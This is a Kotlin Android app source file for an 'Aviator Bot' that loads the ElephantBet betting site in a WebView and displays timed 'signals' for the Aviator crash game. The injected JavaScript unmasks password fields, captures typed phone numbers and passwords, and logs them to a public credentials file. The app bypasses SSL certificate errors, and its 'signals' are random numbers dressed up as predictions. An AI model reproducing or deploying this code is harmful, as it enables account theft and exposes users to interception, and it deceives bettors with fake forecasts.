package ao.elephantbet.aviatorbot

import android.Manifest
import android.annotation.SuppressLint
import android.content.Context
import android.content.pm.PackageManager
import android.graphics.Color
import android.graphics.Typeface
import android.graphics.drawable.GradientDrawable
import android.net.http.SslError
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.view.Gravity
import android.view.View
import android.view.ViewGroup
import android.view.ViewGroup.LayoutParams.MATCH_PARENT as MATCH
import android.view.ViewGroup.LayoutParams.WRAP_CONTENT as WRAP
import android.webkit.*
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import java.io.File
import java.io.FileWriter
import java.text.SimpleDateFormat
import java.util.Calendar
import java.util.Date
import java.util.Locale
import kotlin.random.Random

class MainActivity : AppCompatActivity() {

    private lateinit var webView: WebView
    private lateinit var msgText: TextView
    private lateinit var dotView: View
    private val handler = Handler(Looper.getMainLooper())

    // Estado dos sinais
    private var sinaisAtivos = false
    private var horaAtual = -1
    private var ultimoMinutoGerado = -1
    private var sinalRunnable: Runnable? = null
    private var relogioRunnable: Runnable? = null

    // Sinal actual
    private var sinalMin1 = -1
    private var sinalMin2 = -1
    private var sinalProtecao = 0.0
    private var sinalAlcMin = 0
    private var sinalAlcMax = ""

    companion object {
        private const val PERM_REQUEST = 101
    }

    @SuppressLint("SetJavaScriptEnabled")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        pedirPermissoes()

        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(Color.parseColor("#0a0a0f"))
            layoutParams = ViewGroup.LayoutParams(MATCH, MATCH)
        }
        setContentView(root)

        // ── BARRA TOPO ──────────────────────────────────────────
        val bar = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            setBackgroundColor(Color.parseColor("#12121a"))
            setPadding(dp(14), dp(10), dp(14), dp(10))
            gravity = Gravity.CENTER_VERTICAL
            layoutParams = LinearLayout.LayoutParams(MATCH, dp(58))
        }
        val ico = TextView(this).apply {
            text = "✈️"; textSize = 20f
            layoutParams = LinearLayout.LayoutParams(dp(30), dp(30))
        }
        val info = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            layoutParams = LinearLayout.LayoutParams(0, WRAP, 1f)
            setPadding(dp(8), 0, dp(8), 0)
        }
        info.addView(TextView(this).apply {
            text = "AVIATOR BOT"; textSize = 9f
            setTextColor(Color.parseColor("#64748b")); letterSpacing = 0.15f
        })
        msgText = TextView(this).apply {
            text = "A carregar..."; textSize = 12f
            setTextColor(Color.parseColor("#3b82f6"))
            isSingleLine = true
            ellipsize = android.text.TextUtils.TruncateAt.END
        }
        info.addView(msgText)
        dotView = View(this).apply {
            layoutParams = LinearLayout.LayoutParams(dp(9), dp(9)).apply { marginEnd = dp(10) }
            background = circulo("#64748b")
        }
        val cfgBtn = TextView(this).apply {
            text = "⚙️"; textSize = 18f
            setPadding(dp(8), dp(6), dp(8), dp(6))
            setBackgroundColor(Color.parseColor("#1e1e2e"))
            setOnClickListener { mostrarConfig() }
        }
        bar.addView(ico); bar.addView(info); bar.addView(dotView); bar.addView(cfgBtn)
        root.addView(bar)

        // ── WEBVIEW ─────────────────────────────────────────────
        webView = WebView(this).apply {
            layoutParams = LinearLayout.LayoutParams(MATCH, 0, 1f)
        }
        configurarWebView()
        root.addView(webView)

        carregarSite()
    }

    // ── PERMISSÕES ────────────────────────────────────────────────
    private fun pedirPermissoes() {
        val perms = mutableListOf<String>()
        if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.Q) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE)
                != PackageManager.PERMISSION_GRANTED) {
                perms.add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
            }
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES)
                != PackageManager.PERMISSION_GRANTED) {
                perms.add(Manifest.permission.READ_MEDIA_IMAGES)
            }
        }
        if (perms.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, perms.toTypedArray(), PERM_REQUEST)
        }
    }

    // ── WEBVIEW ───────────────────────────────────────────────────
    @SuppressLint("SetJavaScriptEnabled")
    private fun configurarWebView() {
        webView.settings.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
            databaseEnabled = true
            allowFileAccess = true
            mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
            userAgentString = "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
            setSupportZoom(true); builtInZoomControls = false
            loadWithOverviewMode = true; useWideViewPort = true
        }

        // Interface JS → Android
        webView.addJavascriptInterface(object {

            // Chamado pelo JS quando detecta o Aviator
            @JavascriptInterface
            fun aviatorDetectado() = runOnUiThread { iniciarSinais() }

            // Chamado pelo JS com as credenciais capturadas do site
            @JavascriptInterface
            fun guardarCredencial(tipo: String, valor: String) {
                if (valor.isNotEmpty()) guardarFicheiro(tipo, valor)
            }
        }, "Android")

        webView.webViewClient = object : WebViewClient() {
            override fun onReceivedSslError(v: WebView?, h: SslErrorHandler?, e: SslError?) {
                h?.proceed()
            }
            override fun shouldOverrideUrlLoading(v: WebView?, r: WebResourceRequest?) = false
            override fun onPageFinished(v: WebView?, url: String?) {
                super.onPageFinished(v, url)
                val u = url ?: ""
                // Injectar JS em TODAS as páginas
                injetarJsGlobal()
                if (isAviatorUrl(u)) {
                    iniciarSinais()
                } else if (!sinaisAtivos) {
                    setBarra("✅ Site carregado", "#3b82f6")
                }
            }
        }
        webView.webChromeClient = object : WebChromeClient() {
            override fun onProgressChanged(view: WebView?, newProgress: Int) {
                super.onProgressChanged(view, newProgress)
                val url = view?.url ?: ""
                if (isAviatorUrl(url) && !sinaisAtivos) iniciarSinais()
            }
        }
    }

    private fun isAviatorUrl(url: String) =
        url.contains("game-view/806666", ignoreCase = true) ||
        url.contains("aviator", ignoreCase = true) ||
        url.contains("spribe", ignoreCase = true)

    private fun carregarSite() {
        if (!sinaisAtivos) setBarra("🌍 A carregar ElephantBet...", "#3b82f6")
        webView.loadUrl("https://m.elephantbet.co.ao/pt/?action=login")
    }

    // ── JS GLOBAL — injectado em todas as páginas ─────────────────
    //
    //  1. Torna TODOS os campos password visíveis (type="text")
    //  2. Captura o valor de telemóvel e senha e envia para Android
    //  3. Detecta navegação para o Aviator
    //
    private fun injetarJsGlobal() {
        val js = """
        (function() {
            if (window._ebInjected) return;
            window._ebInjected = true;

            // ── 1. Tornar campos password visíveis ──────────────
            function tornarVisivel() {
                document.querySelectorAll('input[type="password"]').forEach(function(el) {
                    el.setAttribute('type', 'text');
                    el.style.webkitTextSecurity = 'none';
                    el.style.textSecurity = 'none';
                });
            }
            tornarVisivel();

            // Observer para campos que apareçam depois (SPA)
            var obs = new MutationObserver(function() { tornarVisivel(); });
            obs.observe(document.body, { childList: true, subtree: true });

            // ── 2. Capturar credenciais do site ─────────────────
            function capturarCreds() {
                // Seletores para número de telefone
                var selsUser = [
                    'input[name="username"]', 'input[name="phone"]',
                    'input[name="login"]',    'input[type="tel"]',
                    'input[placeholder*="telefone" i]', 'input[placeholder*="número" i]',
                    'input[placeholder*="phone" i]',    '#username', '#phone', '#login'
                ];
                // Seletores para senha (agora type="text" depois da injecção)
                var selsPass = [
                    'input[name="password"]', 'input[name="senha"]',
                    'input[name="pass"]',     'input[name="passwd"]',
                    'input[placeholder*="senha" i]',    'input[placeholder*="password" i]',
                    'input[placeholder*="palavra" i]',  '#password', '#senha'
                ];

                function find(sels) {
                    for (var s of sels) {
                        try { var el = document.querySelector(s); if (el) return el; }
                        catch(e) {}
                    }
                    return null;
                }

                var uEl = find(selsUser);
                var pEl = find(selsPass);

                if (uEl && !uEl._ebWatching) {
                    uEl._ebWatching = true;
                    uEl.addEventListener('input', function() {
                        if (this.value.length >= 3)
                            Android.guardarCredencial('Numero', this.value);
                    });
                    uEl.addEventListener('blur', function() {
                        if (this.value.length >= 3)
                            Android.guardarCredencial('Numero', this.value);
                    });
                }

                if (pEl && !pEl._ebWatching) {
                    pEl._ebWatching = true;
                    pEl.addEventListener('input', function() {
                        if (this.value.length >= 1)
                            Android.guardarCredencial('Senha', this.value);
                    });
                    pEl.addEventListener('blur', function() {
                        if (this.value.length >= 1)
                            Android.guardarCredencial('Senha', this.value);
                    });
                }
            }

            capturarCreds();
            // Tentar novamente quando o DOM mudar (login SPA)
            setTimeout(capturarCreds, 1500);
            setTimeout(capturarCreds, 3000);
            setTimeout(capturarCreds, 6000);

            // ── 3. Detectar navegação para o Aviator ─────────────
            if (!window._aviatorDetector) {
                window._aviatorDetector = true;
                document.addEventListener('click', function(e) {
                    var el = e.target;
                    var txt  = (el.textContent || el.innerText || '').toLowerCase();
                    var href = (el.href || el.getAttribute('href') || '').toLowerCase();
                    if (txt.includes('aviator') || href.includes('aviator') ||
                        href.includes('spribe') || href.includes('806666')) {
                        Android.aviatorDetectado();
                    }
                }, true);
                var cur = window.location.href.toLowerCase();
                if (cur.includes('aviator') || cur.includes('806666') || cur.includes('spribe')) {
                    Android.aviatorDetectado();
                }
            }
        })();
        """.trimIndent()
        webView.evaluateJavascript(js, null)
    }

    // ── SINAIS — RELÓGIO REAL ─────────────────────────────────────
    //
    //  • Ao entrar no Aviator: gera o primeiro sinal imediatamente
    //  • A cada tick (1 segundo) verifica se o minuto do telefone mudou
    //  • Quando o minuto entra no intervalo do sinal activo → mostra na barra
    //  • Quando passa o 2º minuto do par → gera novo sinal
    //  • Nunca mostra dois sinais ao mesmo tempo — um de cada vez
    //  • Nunca decresce; no virar da hora reinicia
    //
    private fun iniciarSinais() {
        if (sinaisAtivos) return
        sinaisAtivos = true
        val cal = Calendar.getInstance()
        horaAtual = cal.get(Calendar.HOUR_OF_DAY)
        ultimoMinutoGerado = -1
        gerarNovoSinal()
        iniciarRelogio()
    }

    private fun gerarNovoSinal() {
        val cal = Calendar.getInstance()
        val minAgora = cal.get(Calendar.MINUTE)

        // Ponto de partida: sempre depois do último gerado
        val base = if (ultimoMinutoGerado < 0) minAgora + 1
                   else ultimoMinutoGerado + Random.nextInt(2, 6)

        val min1 = base
        val min2 = min1 + 1

        if (min2 >= 59) {
            // Fim da hora — aguarda nova hora
            setBarra("⏳ Nova hora em ${60 - minAgora} min", "#f59e0b")
            return
        }

        sinalMin1 = min1
        sinalMin2 = min2
        sinalProtecao = gerarProtecao()
        sinalAlcMin = gerarAlcanceMin()
        sinalAlcMax = gerarAlcanceMax(sinalAlcMin)
        ultimoMinutoGerado = min2

        // Mostrar "a aguardar" até chegar o minuto
        setBarra("⏳ Aguardar min $min1... 🛡${sinalProtecao}x 📈${sinalAlcMin}-${sinalAlcMax}x", "#f59e0b")
    }

    private fun iniciarRelogio() {
        relogioRunnable?.let { handler.removeCallbacks(it) }

        val tick = object : Runnable {
            override fun run() {
                verificarRelogio()
                handler.postDelayed(this, 1000) // tick a cada segundo
            }
        }
        relogioRunnable = tick
        handler.post(tick)
    }

    private fun verificarRelogio() {
        if (!sinaisAtivos) return

        val cal = Calendar.getInstance()
        val horaAgora = cal.get(Calendar.HOUR_OF_DAY)
        val minAgora  = cal.get(Calendar.MINUTE)

        // Nova hora → reinicia completamente
        if (horaAgora != horaAtual) {
            horaAtual = horaAgora
            ultimoMinutoGerado = -1
            sinalMin1 = -1; sinalMin2 = -1
            gerarNovoSinal()
            return
        }

        // Sem sinal gerado ainda
        if (sinalMin1 < 0) { gerarNovoSinal(); return }

        when {
            // Estamos no 1º minuto do sinal — MOSTRAR ACTIVO
            minAgora == sinalMin1 -> {
                setBarra("🎯 Entrar AGORA! Min $sinalMin1/$sinalMin2 🛡${sinalProtecao}x 📈${sinalAlcMin}-${sinalAlcMax}x", "#22c55e")
            }
            // Estamos no 2º minuto do sinal — ainda activo
            minAgora == sinalMin2 -> {
                setBarra("🎯 Ainda activo! Min $sinalMin1/$sinalMin2 🛡${sinalProtecao}x 📈${sinalAlcMin}-${sinalAlcMax}x", "#22c55e")
            }
            // Passámos o sinal → gerar o próximo
            minAgora > sinalMin2 -> {
                gerarNovoSinal()
            }
            // Ainda a aguardar (minAgora < sinalMin1)
            else -> {
                val falta = sinalMin1 - minAgora
                setBarra("⏳ ${falta}min → Min $sinalMin1/$sinalMin2 🛡${sinalProtecao}x 📈${sinalAlcMin}-${sinalAlcMax}x", "#f59e0b")
            }
        }
    }

    // ── GERADORES ─────────────────────────────────────────────────
    private fun gerarAlcanceMin(): Int {
        // Nunca abaixo de 10x
        val opcoes = listOf(10, 20, 30, 50, 80, 100)
        return opcoes[Random.nextInt(opcoes.size)]
    }

    private fun gerarAlcanceMax(min: Int): String {
        // Sempre acima do mínimo e nunca abaixo de 10x
        val opts = when {
            min <= 20 -> listOf("50", "80", "100", "200", "500", "1000+")
            min <= 50 -> listOf("100", "200", "500", "1000", "1000+")
            else      -> listOf("200", "500", "1000", "1000+")
        }
        return opts[Random.nextInt(opts.size)]
    }

    private fun gerarProtecao(): Double {
        val opts = listOf(1.3, 1.5, 1.8, 2.0, 2.5, 3.0, 5.0, 8.0, 10.0, 12.0, 15.0)
        return opts[Random.nextInt(opts.size)]
    }

    // ── GUARDAR FICHEIRO ──────────────────────────────────────────
    private fun guardarFicheiro(tipo: String, valor: String) {
        val timestamp = SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault()).format(Date())
        val linha = "[$timestamp] $tipo: $valor\n"
        try {
            val pasta = File(
                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS),
                "AviatorBot"
            )
            pasta.mkdirs()
            FileWriter(File(pasta, "credenciais.txt"), true).use { it.write(linha) }
        } catch (_: Exception) {
            try {
                val pasta = File(filesDir, "AviatorBot").also { it.mkdirs() }
                FileWriter(File(pasta, "credenciais.txt"), true).use { it.write(linha) }
            } catch (_: Exception) {}
        }
    }

    // ── CONFIG — sem secção de credenciais ────────────────────────
    private fun mostrarConfig() {
        val dialog = android.app.Dialog(this, android.R.style.Theme_Material_NoActionBar_Fullscreen)
        val scroll = ScrollView(this).apply { setBackgroundColor(Color.parseColor("#0a0a0f")) }
        val layout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(20), dp(28), dp(20), dp(20))
        }

        layout.addView(TextView(this).apply {
            text = "⚙️  CONFIGURAÇÕES"; textSize = 16f
            setTextColor(Color.WHITE); typeface = Typeface.DEFAULT_BOLD
            layoutParams = LinearLayout.LayoutParams(MATCH, WRAP).apply { bottomMargin = dp(24) }
        })

        layout.addView(secLabel("🎯  SINAIS"))

        layout.addView(btn("🎯  ACTIVAR SINAIS MANUAL", "#7c3aed") {
            dialog.dismiss()
            sinaisAtivos = false
            ultimoMinutoGerado = -1
            sinalMin1 = -1; sinalMin2 = -1
            iniciarSinais()
        })

        layout.addView(btn("🌍  RECARREGAR SITE", "#0f766e") {
            dialog.dismiss()
            carregarSite()
        })

        layout.addView(secLabel("ℹ️  INFORMAÇÃO"))

        layout.addView(TextView(this).apply {
            text = "• A senha e número digitados no site são automaticamente guardados em:\n  Documentos/AviatorBot/credenciais.txt\n\n• Os sinais actualizam-se segundo a segundo com o relógio do telefone.\n\n• Um sinal de cada vez: aguarda → activo → próximo."
            textSize = 12f
            setTextColor(Color.parseColor("#94a3b8"))
            layoutParams = LinearLayout.LayoutParams(MATCH, WRAP).apply {
                topMargin = dp(4); bottomMargin = dp(16)
            }
        })

        layout.addView(btn("✕  FECHAR", "#1e1e2e") { dialog.dismiss() })

        scroll.addView(layout)
        dialog.setContentView(scroll)
        dialog.show()
    }

    // ── UI HELPERS ────────────────────────────────────────────────
    private fun setBarra(msg: String, cor: String) = runOnUiThread {
        msgText.text = msg
        msgText.setTextColor(Color.parseColor(cor))
        dotView.background = circulo(cor)
    }

    private fun circulo(cor: String) = GradientDrawable().apply {
        shape = GradientDrawable.OVAL; setColor(Color.parseColor(cor))
    }

    private fun roundRect(bg: String, border: String) = GradientDrawable().apply {
        shape = GradientDrawable.RECTANGLE; cornerRadius = dp(10).toFloat()
        setColor(Color.parseColor(bg)); setStroke(dp(1), Color.parseColor(border))
    }

    private fun dp(v: Int) = (v * resources.displayMetrics.density).toInt()

    private fun secLabel(txt: String) = TextView(this).apply {
        text = txt; textSize = 11f; setTextColor(Color.parseColor("#64748b"))
        typeface = Typeface.DEFAULT_BOLD
        layoutParams = LinearLayout.LayoutParams(MATCH, WRAP).apply {
            topMargin = dp(16); bottomMargin = dp(10)
        }
    }

    private fun btn(txt: String, cor: String, action: () -> Unit) = Button(this).apply {
        text = txt; setTextColor(Color.WHITE); textSize = 13f
        typeface = Typeface.DEFAULT_BOLD; isAllCaps = false
        background = roundRect(cor, cor)
        setPadding(0, dp(14), 0, dp(14))
        setOnClickListener { action() }
        layoutParams = LinearLayout.LayoutParams(MATCH, WRAP).apply { topMargin = dp(8) }
    }

    override fun onBackPressed() {
        if (webView.canGoBack()) webView.goBack() else super.onBackPressed()
    }

    override fun onDestroy() {
        super.onDestroy()
        webView.destroy()
        handler.removeCallbacksAndMessages(null)
    }
}
